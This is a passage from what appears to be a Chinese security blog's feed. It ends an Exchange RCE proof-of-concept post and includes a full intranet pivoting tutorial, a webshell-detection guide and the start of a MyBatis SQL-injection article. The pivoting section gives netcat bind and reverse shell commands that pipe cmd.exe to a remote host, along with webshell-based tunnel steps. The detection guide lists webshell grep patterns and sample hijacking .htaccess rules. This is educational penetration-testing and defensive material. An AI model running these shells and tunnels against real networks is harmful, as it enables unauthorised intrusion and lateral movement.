192.168.75.142 harrym@exchangedemo.com:user123### mspaint</span><br><span class="line"></span><br><span class="line">researcher@incite:~$ .&#x2F;poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint</span><br><span class="line">(+) logged in as harrym@exchangedemo.com</span><br><span class="line">(+) found the __viewstate: &#x2F;wEPDwUILTg5MDAzMDFkZFAeyPS7&#x2F;eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5</span><br><span class="line">(+) triggered rce as SYSTEM!</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;更新公告:&lt;a href=&quot;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875&quot;&gt;https://portal.msrc.microsoft.com/en
      
    
    </summary>
    
    
    
      <category term="Exchange-Server" scheme="http://www.ol4three.com/tags/Exchange-Server/"/>
    
  </entry>
  
  <entry>
    <title>代理转发</title>
    <link href="http://www.ol4three.com/2020/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"/>
    <id>http://www.ol4three.com/2020/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/</id>
    <published>2020-09-13T20:14:11.000Z</published>
    <updated>2020-12-01T11:34:53.530Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>代理转发就是将一个端口，端口可以为主机端口也可以是访问到的人以主机的端口，转发到任意一台可以访问到的IP上</p><h2 id="区分正向连接和反向连接"><a href="#区分正向连接和反向连接" class="headerlink" title="区分正向连接和反向连接"></a>区分正向连接和反向连接</h2><ul><li>正向连接：你的机器连接目标机器</li><li>反向连接：目标机器反连你的机器（当防火墙设置端口过滤的话使用）</li><li>不论映射，还是转发，都有正有反，原理相同</li></ul><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913231620854.png" alt="img"></p><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><p>nc的正向连接：</p><p>  在公网服务器上监听他的cmd.exe 命令为：nc.exe -l -p 4444 -e cmd.exe</p><p>  在攻击者上监听nc -vv 公网服务器ip 4444</p><p>  可以获取到公网服务器的cmd</p><p>nc的反向代理：</p><p>  在公网服务器上监听自己的4444端口：nc.exe -lvp 4444</p><p>  在内网主机中进行：nc -t -e cmd.exe 公网ip 4444</p><p>  公网可成功获取内网cmd</p><h3 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h3><p>LCX的内网端口转发（防火墙做过滤不允许别人连接自己的3389）</p><p>  内网执行lcx.exe -slave 公网ip 4444 127.0.0.1 3389  内网将自己的3389端口转发到公网的4444端口</p><p>  公网主机监听自己端口 lcx.exe -listen 4444 5555</p><p>则攻击者连接公网ip的5555端口即可连接上内网的3389</p><p>LCX的本地端口转发（防火墙做过滤不允许自己的3389连接出去）</p><p>  防火墙限制，部分端口无法通过防火墙，可以将目标主机的3389端口传到允许的其他端口比如53，则在目标主机执行：lcx -tran 53 目标主机ip 3389</p><p>  可以直接连接目标主机的ip:53</p><h3 id="ew做代理"><a href="#ew做代理" class="headerlink" title="ew做代理"></a>ew做代理</h3><p>①<strong>首先在VPS上做相应的代理监听：</strong></p><p><strong>./ew_for_Linux32 -s rcsocks -l 1008 -e 888</strong></p><p><strong>在VPS上 监听888端口 并加端口转发给 本地的 1008端口</strong></p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19627.png" alt="0"></p><p>② <strong>在客户端(内网环境)连接VPS的888端口</strong></p><p><strong>ew_for_Win.exe -s rssocks -d 104.224.150.102 -e 888</strong></p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19653.png" alt="0"></p><p>🌂<strong>利用相应的代理软件 来监听 VPS的1008端口既可以进行内网穿透式连接</strong></p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19655.png" alt="0"></p><h3 id="利用frp做代理"><a href="#利用frp做代理" class="headerlink" title="利用frp做代理"></a>利用frp做代理</h3><p>download：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>①<strong>首先在VPS上做如下配置：</strong></p><p><strong>修改 frps.ini</strong></p><p><strong>bind_port = 8080</strong></p><p><strong>privilege_token = pentest999</strong></p><p><strong>运行 nohup ./frps -c frps.ini &amp;</strong></p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19664.png" alt="0"></p><p>②<strong>在客户端上做如下配置：</strong></p><p><strong>修改 frpc.ini</strong></p><p><strong>[common]</strong></p><p><strong>server_addr = vps ip</strong></p><p><strong>server_port = 8080</strong></p><p><strong>privilege_token = pentest999</strong></p><p><strong>[plugin_socks5]</strong></p><p><strong>type = tcp</strong></p><p><strong>remote_port = 8081</strong></p><p><strong>plugin = socks5</strong></p><p><strong>plugin_user = ptest33333</strong></p><p><strong>plugin_passwd = ptest66666</strong></p><p><strong>运行 frpc -c fprc.ini</strong></p><p><strong>🌂利用相应的socks5代理连接 VPS的 8081端口即可</strong></p><h3 id="ssh-隧道代理转发"><a href="#ssh-隧道代理转发" class="headerlink" title="ssh 隧道代理转发"></a>ssh 隧道代理转发</h3><p>ssh 有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。</p><p>本地访问127.0.0.1:port1就是host:port2(用的更多)<br><code>ssh -CfNg -L port1:127.0.0.1:port2 user@host</code> #本地转发<br>访问host:port2就是访问127.0.0.1:port1<br><code>ssh -CfNg -R port2:127.0.0.1:port1 user@host</code> #远程转发<br>可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口<br><code>ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip</code> #正向隧道 监听本地port 可以将dmz_host的hostport端口转发到remote_ip的port端口<br><code>ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip</code> #反向隧道<br>用于内网穿透防火墙限制之类<br>socket 代理: <code>ssh -qTfnN -D port remotehost</code></p><h3 id="毒刺Stinger进行端口转发"><a href="#毒刺Stinger进行端口转发" class="headerlink" title="毒刺Stinger进行端口转发"></a>毒刺Stinger进行端口转发</h3><p><strong>端口转发</strong></p><ol><li>将stinger_server和proxy.php上传到目标服务器,确保 <a href="http://192.168.1.106:81/proxy.php可以访问,页面返回">http://192.168.1.106:81/proxy.php可以访问,页面返回</a> stinger XXX!</li><li>目标服务器执行如下命令启动代理服务(使用菜刀执行命令时可以添加start /b 或&amp; 后台运行,确保服务端7000端口未被占用)</li></ol><p>PS C:\Users\test\Desktop&gt; .\stinger_server_win_x64.exe -listen 127.0.0.1:7000 -username test -password testpass</p><ol><li>本地PC执行如下命令连接代理脚本</li></ol><p>stinger_client_win_x64.exe -local 127.0.0.1:1080 -proxy_server <a href="http://192.168.1.106:81/proxy.php">http://192.168.1.106:81/proxy.php</a> -remote_server <a href="http://127.0.0.1:7000">http://127.0.0.1:7000</a> -remote 127.0.0.1:3389 -username test -password testpass</p><ol><li>此时已经将192.168.1.106的3389端口映射到了你本地pc的1080端口</li></ol><p><strong>SOCK5代理</strong></p><ol><li>将stinger_server和proxy.php上传到目标服务器,确保 <a href="http://192.168.1.106:81/proxy.php可以访问,页面返回">http://192.168.1.106:81/proxy.php可以访问,页面返回</a> stinger XXX!</li><li>目标服务器执行如下命令启动代理服务(使用菜刀执行命令时可以添加start /b 或&amp; 后台运行,确保服务端7000,8000端口未被占用)</li></ol><p>PS C:\Users\test\Desktop&gt; .\stinger_server_win_x64.exe -listen 127.0.0.1:7000 -username test -password testpass -socks5Addr 127.0.0.1:8000</p><ol><li>本地PC执行如下命令连接代理脚本</li></ol><p>stinger_client_win_x64.exe -local 127.0.0.1:1080 -proxy_server <a href="http://192.168.1.106:81/proxy.php">http://192.168.1.106:81/proxy.php</a> -remote_server <a href="http://127.0.0.1:7000">http://127.0.0.1:7000</a> -remote 127.0.0.1:8000 -username test -password testpass</p><ol><li>此时你本地PC已经在1080生成一个SOCKS5代理,可以使用该代理访问目标内网</li></ol><p><strong>已测试</strong></p><p><strong>stinger_server\stinger_client</strong></p><ul><li>windows</li><li>linux</li></ul><p><strong>proxy.jsp/php/aspx</strong></p><ul><li>php7.2</li><li>tomcat7.0</li><li>iis8.0</li></ul><p><strong>已知问题</strong></p><ul><li>client端的socket连接无法自动释放</li></ul><p><strong>结语</strong></p><ul><li>php是最好的语言</li><li>啊D是最好的渗透测试工具</li></ul><h3 id="reGeorg端口转发"><a href="#reGeorg端口转发" class="headerlink" title="reGeorg端口转发"></a>reGeorg端口转发</h3><p>reGeorg不用多介绍了，内网渗透中常用工具之一。小白经常用于渗透测试中的内网转发，主要是因为方便实用。这个工具需要配合</p><p>proxifier,使用的socks5代理进行运用的。标红的是我们需要的脚本，根据自己的需要结合实际测试环境来选用的。 </p><p>首先我们现经代理脚本上传到服务器，实验的环境是jsp的，所以上传代理脚本tunnel.nosocket.jsp，然后我们在浏览器访问一下，如果出现以下提示就说明代理成功。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913233151005.png" alt="image-20200913233151005"></p><p>上传代理脚本成功后，我们打开proxifier进行配置参数，代理的端口默认是8888，代理的规则我们设置为谷歌浏览器，如果其它的不需要可以去掉勾：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913233205362.png" alt="image-20200913233205362"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913233216450.png" alt="image-20200913233216450"></p><p>上述代理参数配置完毕后，我们在cmd输入一下命令就会出现下面的界面:python2.exe reGeorgSocksProxy.py -p 8888 -u<a href="http://xxxx:8888/tran.jsp。这样的话我们就把内网的流量代理到外面，我们下一步就可以使用扫描工具进行内网的横向扫描。就这么简单直接。如果内网中的3389只能是内网进行连接的话，我们可以使用mstsc.exe通过代理进行连接3389远程桌面，其它的端口都是一样的道理，灵活运用即可。">http://xxxx:8888/tran.jsp。这样的话我们就把内网的流量代理到外面，我们下一步就可以使用扫描工具进行内网的横向扫描。就这么简单直接。如果内网中的3389只能是内网进行连接的话，我们可以使用mstsc.exe通过代理进行连接3389远程桌面，其它的端口都是一样的道理，灵活运用即可。</a></p><h3 id="Tunna端口转发"><a href="#Tunna端口转发" class="headerlink" title="Tunna端口转发"></a>Tunna端口转发</h3><p>Tunna这个工具使用起来也特方便，脚本的编写也是基于Python2版本。运用的时候也需要我们把代理脚本上传到目标服务器，然后通过代理内网的某个端口，注意这个工具只能代理一个端口，有点局限性。但是我们可以代理3389、22、3306、1433等敏感端口，然后将敏感端口流量转发了外网的的某个端口，我们再通过本地连接外网的端口进行连接，这样的话我们就可以使用了。</p><p>第一步：我们将代理脚本上传到目标服务器，在浏览器访问代理脚本是否被解析</p><p>第二步：运行proxy.py 并指定端口 python proxy.py -u<a href="http://219.x.x.x/conn.jsp">http://192.168.205.143/conn.php </a>-l 1234 -r 3389 -v</p><p>第三步：本地执行rdesktop 127.0.0.1:1234</p><h3 id="reDuh端口转发"><a href="#reDuh端口转发" class="headerlink" title="reDuh端口转发"></a>reDuh端口转发</h3><p>reDuh也是一款内网渗透利器，这个工具可以把内网服务器的端口通过http/https隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。服务端是个webshell，工具里面针对不同服务器有aspx,php,jsp三个版本，客户端是java写的，本机执行最好装上JDK软件。</p><p>我们将代理脚本上传到目标服务器，在本地访问代理脚本</p><p>这样我们执行一下三条命令就可以成功将目标主机的3389端口代理到本地的1234端口，本地连接1234端口就可以登陆内网服务器。</p><p>java -jar reDuhClient.ja r<a href="http://somesite.com/reDuh.php">http://somesite.com/reDuh.php</a></p><p>本地连接1010端口</p><p>nc -vv localhost 1010</p><p>连接成功会有欢迎提示，之后输入命,在java命令窗口执行</p><p>[createTunnel]1234:127.0.0.1:3389</p><h3 id="基于powershell的socks代理"><a href="#基于powershell的socks代理" class="headerlink" title="基于powershell的socks代理"></a>基于powershell的socks代理</h3><p>介绍github：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;p3nt4&#x2F;Invoke-SocksProxy&#x2F;master&#x2F;Invoke-SocksProxy.psm1</span><br></pre></td></tr></table></figure><p>在1234端口创建一个Socks 4/5 代理:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line"></span><br><span class="line">Invoke-SocksProxy -bindPort 1234</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105450022-144254035.png" alt="img"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105454678-661386867.png" alt="img"></p><p>效果:</p><p>这里用同网段的另一个win7，使用Proxifer去使用靶机的1234端口进行socks代理</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105508839-410586839.png" alt="img"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105513706-1137528557.png" alt="img"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105517733-108622092.png" alt="img"></p><p>增加线程(默认是200,增加到400,默认端口1080)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line"></span><br><span class="line">Invoke-SocksProxy -threads 400</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105536542-1886506584.png" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概念：&quot;&gt;&lt;a href=&quot;#概念：&quot; class=&quot;headerlink&quot; title=&quot;概念：&quot;&gt;&lt;/a&gt;概念：&lt;/h2&gt;&lt;p&gt;代理转发就是将一个端口，端口可以为主机端口也可以是访问到的人以主机的端口，转发到任意一台可以访问到的IP上&lt;/p&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://www.ol4three.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="代理转发" scheme="http://www.ol4three.com/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>检测PHP网站是否被攻破的方法</title>
    <link href="http://www.ol4three.com/2020/09/13/WEB/%E6%A3%80%E6%B5%8BPHP%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E8%A2%AB%E6%94%BB%E7%A0%B4%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://www.ol4three.com/2020/09/13/WEB/%E6%A3%80%E6%B5%8BPHP%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E8%A2%AB%E6%94%BB%E7%A0%B4%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2020-09-12T19:39:10.000Z</published>
    <updated>2020-09-12T19:42:10.826Z</updated>
    
    <content type="html"><![CDATA[<p><strong>0x01 查看访问日志</strong></p><p><strong>查看是否有文件上传操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IPREMOVED - - [01&#x2F;Mar&#x2F;2013:06:16:48 -0600] &quot;POST&#x2F;uploads&#x2F;monthly_10_2012&#x2F;view.php HTTP&#x2F;1.1&quot; 200 36 &quot;-&quot; &quot;Mozilla&#x2F;5.0&quot; IPREMOVED - - [01&#x2F;Mar&#x2F;2013:06:12:58 -0600] &quot;POST&#x2F;public&#x2F;style_images&#x2F;master&#x2F;profile&#x2F;blog.php HTTP&#x2F;1.1&quot; 200 36 &quot;-&quot; &quot;Mozilla&#x2F;5.0&quot;</span><br></pre></td></tr></table></figure><p><strong>nginx默认记录的日志格式为：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access_log logs&#x2F;access.log</span><br></pre></td></tr></table></figure><p><strong>或</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access_log logs&#x2F;access.log combined;</span><br></pre></td></tr></table></figure><p><strong>nginx默认记录日志的位置为</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx安装目录&#x2F;log&#x2F;</span><br></pre></td></tr></table></figure><p><strong>iis默认记录日志的位置为：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%inetpub%\logs\LogFiles</span><br></pre></td></tr></table></figure><p><strong>apache默认记录日志的位置为：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%apache%\logs\error.log</span><br></pre></td></tr></table></figure><p><strong>weblogic默认记录日志的位置为：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%base_domain%\servers\AdminServer\logs\</span><br></pre></td></tr></table></figure><p><strong>0x02 查找还有恶意的php代码文件</strong></p><p><strong>2.1查找最近发生变化的php文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; -mtime -7</span><br><span class="line"></span><br><span class="line">-type表示搜索一般文件，-mtime -7表示7*24小时内修改的文件</span><br></pre></td></tr></table></figure><p>结果可能如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;uploads&#x2F;monthly_04_2008&#x2F;index.php .&#x2F;uploads&#x2F;monthly_10_2008&#x2F;index.php .&#x2F;uploads&#x2F;monthly_08_2009&#x2F;template.php .&#x2F;uploads&#x2F;monthly_02_2013&#x2F;index.php</span><br></pre></td></tr></table></figure><p><strong>2.2 查找文件中是否存在疑似代码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;eval *(&quot; --color</span><br></pre></td></tr></table></figure><p><strong>*( 代表任意个空格</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;base64_decode *(&quot; --color find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;gzinflate *(&quot; --color find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;eval *(str_rot13 *(base64_decode *(&quot; --color</span><br></pre></td></tr></table></figure><p>注解：很多命令不支持管道传递参数，而实际上又需要这样，所以就用了<strong>xargs命令，这个命令可以用来管道传递参数</strong>；<strong>grep -l表示只包含某个字符串的文件名</strong>，如果去掉-l则会显示匹配特定字符串的行内容</p><p>几个特殊字符串的意义: </p><p><strong>eval()**</strong>把字符串按照php代码来执行，是最常见的php一句话木马**</p><p><strong>base64_decode()</strong> <strong>将字符串base64解码，攻击的时候payload是base64编码，则这个函数就有用武之地了</strong></p><p><strong>gzinflate()</strong> <strong>将字符串解压缩处理，攻击的时候payload用gzdeflate压缩之后，使用这个函数进行解压缩</strong></p><p><strong>str_rot13()</strong> <strong>对字符串进行rot13编码</strong></p><p>也可以使用正则表达式来搜索文件，查找可以代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;*php&#39; | xargs egrep -i &quot;(mail|fsockopen|pfsockopen|stream\_socket\_client|exec|system|passthru|eval|base64_decode) *(&quot;</span><br></pre></td></tr></table></figure><p>下面解释webshell常用的函数：</p><p><strong>mail()：**</strong>可用来向网站用户发送垃圾邮件**</p><p><strong>fsockopen()**</strong>:打开一个网络连接或者一个unix套接字连接，可用于payload发送远程请求**</p><p><strong>pfsockopen()**</strong>:和<strong><strong>fsockopen()</strong></strong>作用类似**</p><p><strong>stream_socket_client()**</strong>:建立一个远程连接，**</p><p><strong>例子如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $fp &#x3D; stream_socket_client(&quot;tcp:&#x2F;&#x2F;www.example.com:80&quot;, $errno, $errstr, 30);   if (!$fp) &#123;     echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;   &#125; else &#123;     fwrite($fp, &quot;GET &#x2F; HTTP&#x2F;1.0\r\nHost: www.example.com\r\nAccept: *&#x2F;*\r\n\r\n&quot;);     while (!feof($fp)) &#123;       echo fgets($fp, 1024);     &#125;     fclose($fp);   &#125;   ?&gt;</span><br></pre></td></tr></table></figure><p><strong>exec()**</strong>:命令执行函数**</p><p><strong>system()**</strong>:同<strong>**exec()</strong></p><p><strong>passthru()**</strong>:同<strong>**exec()</strong></p><p>preg_replace()正则表达式由修饰符”e”修饰的时候，替换字符串在替换之前需要按照php代码执行，这种情况也需要考虑到，这种情况可采用这种以下扫搜：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs egrep -i &quot;preg_replace *\(([&#39;|\&quot;])(.).*\2[a-z]*e[^\1]*\1 *,&quot; --color</span><br></pre></td></tr></table></figure><p><strong>0x03 比较代码文件</strong></p><p>这种情况需要有一份干净的代码，这份代码和正在使用的代码进行比较。例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -r wordpress-clean&#x2F; wordpress-compromised&#x2F; -x wp-content</span><br></pre></td></tr></table></figure><p>上面的例子是比较wordpress-clean/ 和wordpress-comprised/两个目录，并且目录里面的wp-content/子目录不比较</p><p><strong>0x04 搜寻可写的目录</strong></p><p>看看这个目录里面是否有可疑的文件，如下脚本查找权限为777的目录是否存在php文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search_dir&#x3D;$(pwd) writable_dirs&#x3D;$(find $search_dir -type d -perm 0777) for dir in $writable_dirs    do        #echo %dir        find $dir -type -f -name &#39;*.php&#39; done        </span><br></pre></td></tr></table></figure><p><strong>黑客经常在jpg中插入php代码，因此在查询这些目录的时候也要查询jpg文件：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find wp-content&#x2F;uploads -type f -iname &#39;*.jpg&#39; | xargs grep -i php</span><br></pre></td></tr></table></figure><p><strong>注意：-iname 表示文件名不区分大小写 grep -i 也表示不区分大小写</strong></p><p><strong>0x05 检测iframe标签</strong></p><p>黑客经常做的是嵌入iframe标签，因此可以查看网页的源代码，并且搜索其中是否存在iframe标签，可使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i &#39;&lt;iframe&#39; mywebsite.txt</span><br></pre></td></tr></table></figure><p>对于动态生成的页面，可使用firefox的<a href="https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/">Live HTTP Headers</a>插件，下载到源码之后再查找是否存在iframe标签</p><p><strong>0x06 查找数据库中是否存在敏感字符串</strong></p><p>包括%base64_%、%eval(% 等上面提到的一些关键字</p><p><strong>0x07 检查.htacess文件</strong></p><p>是否包含了auto_prepend_file和auto_append_file，使用如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;\.htaccess&#39; | xargs grep -i auto_prepend_file find . -type f -name &#39;\.htaccess&#39; | xargs grep -i auto_append_file</span><br></pre></td></tr></table></figure><p><strong>注释：.htacess</strong></p><p><strong>（</strong>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<strong>）</strong></p><p><strong>uto_prepend_file**</strong>的作用是加载当前脚本文件之前，先加载的php脚本 auto_append_file的作用是加载当前脚本文件之后，再加载的php脚本。黑客如果这么修改了.htaccess文件，那么可以在访问.htaccess目录的php脚本时，加载上自己想要加载的恶意脚本 .**</p><p>htaccess文件还可以被用来把访问网站的流量劫持到黑客的网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteCond %&#123;HTTP_USER_AGENT&#125;^.*Baiduspider.*$ Rewriterule ^(.*)$ http:&#x2F;&#x2F;www.hacker.com&#x2F;muma.php [R&#x3D;301]</span><br></pre></td></tr></table></figure><p><strong>将baidu爬虫的访问重定向到黑客的网站(包含HTTP_USER_AGENT和http关键字)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteCond %&#123;HTTP_REFERER&#125; ^.*baidu.com.*$ Rewriterule ^(.*)$ http:&#x2F;&#x2F;www.hacker.com&#x2F;muma.php [R&#x3D;301]</span><br></pre></td></tr></table></figure><p><strong>将来自baidu搜索引擎的流量重定向到黑客的网站(包含HTTP_REFERER和http关键字)</strong> </p><p>为了查看网站是否被.htaccess修改导致流量劫持，可以在搜索.htaccess文件的时候采用如下命令： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &#39;\.htaccess&#39; | xargs grep -i http; find . -type f -name &#39;\.htaccess&#39; | xargs grep -i HTTP_USER_AGENT;  find . -type f -name &#39;\.htaccess&#39; | xargs grep -i HTTP_REFERER</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;0x01 查看访问日志&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看是否有文件上传操作&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="PHP网站" scheme="http://www.ol4three.com/tags/PHP%E7%BD%91%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>mybatis框架sql注入针对性渗透测试与修复</title>
    <link href="http://www.ol4three.com/2020/09/13/WEB/mybatis%E6%A1%86%E6%9E%B6sql%E6%B3%A8%E5%85%A5%E9%92%88%E5%AF%B9%E6%80%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BF%AE%E5%A4%8D/"/>
    <id>http://www.ol4three.com/2020/09/13/WEB/mybatis%E6%A1%86%E6%9E%B6sql%E6%B3%A8%E5%85%A5%E9%92%88%E5%AF%B9%E6%80%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BF%AE%E5%A4%8D/</id>
    <published>2020-09-12T19:12:20.000Z</published>
    <updated>2020-12-01T12:31:39.240Z</updated>
    
    <content type="html"><![CDATA[<p>mybatis框架sql注入针对性渗透测试与修复</p><p>0X00背景</p><p>在国内，政府、国企、央企等重点单位的内网应用系统基本都以JAVA为主。由于重点单位对于应用系统的性能、功能、扩展性等各方面及厂商开发快速性要求，SSM框架成为系统架构首选。这种情况下，有必要对梳理SSM框架相关的渗透测试入侵点。本文将针对Mybatis框架易发生注入的点做简单讨论。</p><p>0X01 Mybatis概述</p><p>Mybatis是支持定制化的SQL、存储过程以及高级映射的优秀的持久层框架。</p><p>避免了几乎所有的JDBC代码，手动设置参数以及获取结果集的操作。可以对配置和原生的Map使用简单的XML或注解，将接口和java的POJOs映射成数据库中的记录，极大提高了开发效率。</p><p>因为框架避免了用户直接进行SQL语句的拼接，以至于部分开发或安全同学认为只要使用了Mybatis框架，就可以杜绝SQL注入。显然这是不可能的，须知没有免费的午餐，惰性永存，作为安全从业者的我们就是在对抗人性的缺点。</p><p>接下来，我们首先了解Mybatis在配置SQL语句时候的两种描述参数的方式</p><p>一种为：#{}</p><p>一种为：${}</p><p>比如</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsBretYk.jpg" alt="img" style="zoom:50%;"> <p>这个语句selectPerson,接受一个int(或integer)类型的参数，并返回一个hashmap类型的对象。</p><p>注意这里的参数符号是：#{id}</p><p>该情况下，Mybatis会创建一个预处理语句参数，通过JDBC，这样的一个参数在SQL中会由一个“？”来标识，并传递到一个新的预处理语句当中，就像这样：</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsYYuKjL.jpg" alt="img" style="zoom:50%;"> 